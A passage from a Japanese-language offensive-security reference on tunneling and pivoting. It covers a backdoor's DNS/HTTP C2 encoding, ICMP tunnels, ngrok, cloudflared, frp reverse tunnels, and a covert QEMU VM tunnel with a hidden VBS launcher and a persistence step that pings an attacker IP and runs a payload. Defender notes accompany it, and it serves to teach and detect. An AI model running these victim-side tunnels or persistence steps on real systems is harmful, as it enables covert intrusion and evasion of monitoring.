• *task requests* には `1`、*results* には `2` を先頭に付け、異なる fields（flags、SessionID、computer name）を連結します。
• 各 field は ASCII key `VHBD@H` で **XOR-encrypted** され、hex-encoded された後、dots で結合されます。最後に attacker-controlled domain で終わります。

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests は **TXT**（および fallback の **MG**）records に対して `DnsQuery()` を使用します。
• Response が 0xFF bytes を超える場合、backdoor は data を 63-byte pieces に **fragments** し、markers:
`s<SessionID>t<TOTAL>p<POS>` を挿入して、C2 server が並べ替えられるようにします。

2. **HTTP mode (AK47HTTP)**
• JSON envelope を構築します。
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• blob 全体を `VHBD@H` で XOR → hex → `Content-Type: text/plain` header を付けた **`POST /`** の body として送信します。
• Reply も同じ encoding に従い、`cmd` field は `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team notes
• first label が長い hexadecimal で、常に 1 つの rare domain で終わる unusual **TXT queries** を探します。
• Constant XOR key に続く ASCII-hex は YARA で容易に検出できます: `6?56484244?484`（hex 表記の `VHBD@H`）。
• HTTP では、pure hex で 2 bytes の倍数になっている text/plain POST bodies を flag します。

{{#note}}
この channel は各 sub-domain label を 63-octet の DNS limit 内に維持しますが、protocol compliance だけで stealthy になるわけではありません。rare domains、長い hexadecimal labels、query volume は引き続き detection signals です。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans は、TUN device と ICMP echo requests を使用する IPv4-over-ICMP tunnel について説明しています。setup には interface を作成するのに十分な privileges が必要です。<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**こちらからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng は TCP 接続を ICMP 経由で転送し、以下に示す `-p`、`-l`、`-r`、`-R` オプションを、それぞれ proxy、local listener、destination host、destination port に使用します。<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) は、secure tunnel を通じてローカルネットワークサービスをオンラインで公開するための agent です。CLI では HTTP、TCP、file URL endpoint がドキュメント化されており、表示される endpoint hostname は endpoint と account によって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用方法

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は authentication および TLS オプションにも対応しています。<sup>[[39]](#references)</sup>_

#### TCP の Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPでファイルを公開する
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls の sniffing

_XSS、SSRF、SSTI などに有用_\
standalone agent は、デフォルトで `http://127.0.0.1:4040` に HTTP inspection interface を公開します。この interface は HTTP traffic 用です。<sup>[[40]](#references)</sup>

#### internal HTTP service の tunneling

`--host-header=rewrite` オプションは、upstream HTTP `Host` header を local service に一致するよう書き換えます。<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml のシンプルな設定例

これは ngrok Agent Config v2 を使用します。名前付きトンネルでは `proto` と `addr` を使用し、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3 つのトンネルを開きます。

- TCP 2 つ
- /tmp/httpbin/ から静的ファイルを公開する HTTP 1 つ
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel の `cloudflared` connector は outbound connection を確立します。公開された application では HTTP、HTTPS、TCP、SSH、RDP を route できます。一方、quick tunnel は HTTP development 用です。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel のワンライナー
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin（legacy mode）

legacy `--socks5` flag は、ローカルの origin が SOCKS5 を使用することを `cloudflared` に伝えます。ローカル SOCKS5 listener は作成しません。managed tunnel では、`originRequest.proxyType: socks` により SOCKS5 origin の処理を設定します。<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNSによる永続的なトンネル

ローカルで管理されるトンネル設定では、以下に示すように小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
コネクタを起動します：
```bash
cloudflared tunnel run mytunnel
```
コネクターは outbound 接続を確立し、デフォルトでは QUIC をネゴシエートして、フォールバックとして HTTP/2 を使用します。すべてのデプロイメントが TCP/443 を使用すると想定しないでください。デプロイメントに必要な権限のみで実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は **TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP** をサポートする Go 製 reverse proxy です。XTCP は、成功可否が NAT に依存する P2P hole punching を使用します。**v0.53.0** 以降は **SSH Tunnel Gateway** として動作できるため、ターゲットホストは `frpc` バイナリなしで標準の OpenSSH client を使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 新しい SSH gateway の使用（frpc binary なし）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上記のコマンドは、`frps` が gateway を提供する環境で、標準の OpenSSH client を使用して被害者の **8080** ポートを **attacker_ip:9000** として公開します。<sup>[[50]](#references)</sup>

## QEMU を使用した Covert VM-based Tunnels

QEMU の user-mode networking では、virtual network に root や administrator の権限は必要ありません。また、`-netdev user,hostfwd=...` により、host から guest への TCP、UDP、または UNIX 接続をリダイレクトできます。<sup>[[51]](#references)</sup> TrustedSec は、host に重点を置いた EDR では guest 内部のアクティビティを見逃す可能性があるインシデントにおいて、Tiny Core QEMU VM と試行された reverse SSH tunnel について記録しています。<sup>[[1]](#references)</sup>

### 簡単なワンライナー
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上記のコマンドは、256 MiBのゲストメモリとqcow2ディスクイメージを備えた **Tiny Core Linux** guestを起動します。このディスクイメージはRAM上のディスクではありません。
• Windowsホストの **2222/tcp** ポートは、guest内部の **22/tcp** に透過的にforwardされます。
• attackerの観点では、targetが公開しているのは単に2222ポートです。そこに到達したパケットは、VM内で実行されているSSH serverによって処理されます。

### VBScriptを介したステルスな起動

TrustedSecは、上記で引用したincidentにおいて、VBSによるQEMUの起動とTiny Core imageを確認しました。<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになります。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

引用されたインシデントでは、ステートレスな Tiny Core ゲストで `/opt/bootlocal.sh` と `/opt/filetool.lst` を使用して永続化しています。<sup>[[1]](#references)</sup>

1. ペイロードを `/opt/123.out` に配置する
2. `/opt/bootlocal.sh` に追記する：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `/opt/filetool.lst` に `home/tc` と `opt` を追加し、シャットダウン時にペイロードが `mydata.tgz` にパックされるようにする。

### テレメトリに関する考慮事項

• ホストには引き続き、QEMU プロセス、qcow2 イメージ、およびホストから転送されたリスナーが公開される。
• ホストのみを対象としたプロセススキャンでは、ゲストプロセスを調査しない可能性があるが、仮想化による回避が保証されるわけではない。ネットワーク、QEMU、イメージのテレメトリから検出される可能性がある。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある **予期しない QEMU/VirtualBox/KVM バイナリ** を検知する。
• `qemu-system*.exe` から発信される outbound 接続をブロックする。
• QEMU の起動直後にバインドされる、まれなリスニングポート（2222、10022、…）を調査する。

## `HttpAddUrl` による IIS/HTTP.sys リレーノード（ShadowPad）

Check Point は、ShadowPad の IIS モジュールについて、`HttpAddUrl` を介して URL プレフィックスをバインドし、侵害された境界 Web サーバーを backdoor および relay node に変えるものだと説明しています。<sup>[[3]](#references)</sup>

同じレポートでは、以下にまとめたデフォルト設定、ワイルドカードリスナー、パケット復号、relay queue、debug telemetry についても詳しく説明しています。<sup>[[3]](#references)</sup>

* **Config defaults** – モジュールの JSON config で値が省略されている場合、実在しそうな IIS のデフォルト値（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）にフォールバックする。これにより、通常のトラフィックには IIS が正しい branding で応答する。
* **Wildcard interception** – オペレーターは URL プレフィックスのリスト（host と path にワイルドカードを使用）をセミコロン区切りで指定する。モジュールは各エントリに対して `HttpAddUrl` を呼び出すため、HTTP.sys は一致するリクエストを悪意のある handler にルーティングし、一致しないリクエストは通常の IIS の動作にフォールバックする。
* **Encrypted first packet** – request body の最初の 2 バイトに、カスタム 32-bit PRNG の seed が格納される。以降の各バイトは、protocol parsing の前に生成された keystream と XOR される：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – モジュールは 2 つのリスト、「servers」（upstream nodes）と「clients」（downstream implants）を管理する。約 30 秒以内に heartbeat が届かないエントリは削除される。両方のリストが空でない場合、最初の正常な server と最初の正常な client をペアリングし、一方が接続を閉じるまで両者の socket 間で bytes を単純に pipe する。
* **Debug telemetry** – オプションの logging により、各ペアリングの source IP、destination IP、転送された bytes の合計が記録される。Investigators はこれらの breadcrumbs を使用して、複数の victim にまたがる ShadowPad mesh を再構築した。

---

## 確認すべきその他のツール

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Shadow に潜む：QEMU Virtualization による Covert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 以前：Storm-2603 の過去の Ransomware Operations を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon の内部：Stealthy Offensive Operation の Relay Network と内部動作を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide：Firewall/IDS Restrictions の回避](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：Metasploit における Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：BOF-PE による CDN-Fronted Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
